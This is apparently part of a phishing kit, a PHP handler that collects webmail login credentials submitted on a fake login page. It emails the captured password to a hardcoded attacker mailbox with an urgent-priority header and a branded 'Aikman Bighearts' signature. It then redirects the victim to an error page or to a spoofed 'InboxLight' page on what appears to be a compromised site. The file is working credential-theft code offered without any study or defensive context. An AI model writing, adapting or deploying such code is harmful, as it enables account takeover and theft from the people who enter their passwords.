...
$pass = $_POST['password'];
$own = 'narcosltd@protonmail.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$server = date("D/M/d, Y g:i a"); 
$sender = 'aikman@bighearts.net';
$page = 'Webmail';
$subj = "$page Login";
$headers .= "From: Aikman<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = '';
$msg = "<HTML><BODY><TABLE>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'><b>AIKMAN BIGHEARTS</b><img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
 ...
 <tr><td><b>Aikman Bighearts* :</b> Nobody be anybody to somebody </td></tr>
 </BODY>
 </HTML>";
if (empty($email) || empty($pass)) {
header( "Location: http://przebudzenie.org.pl/modules/mod_artclock/general/index.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: error.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
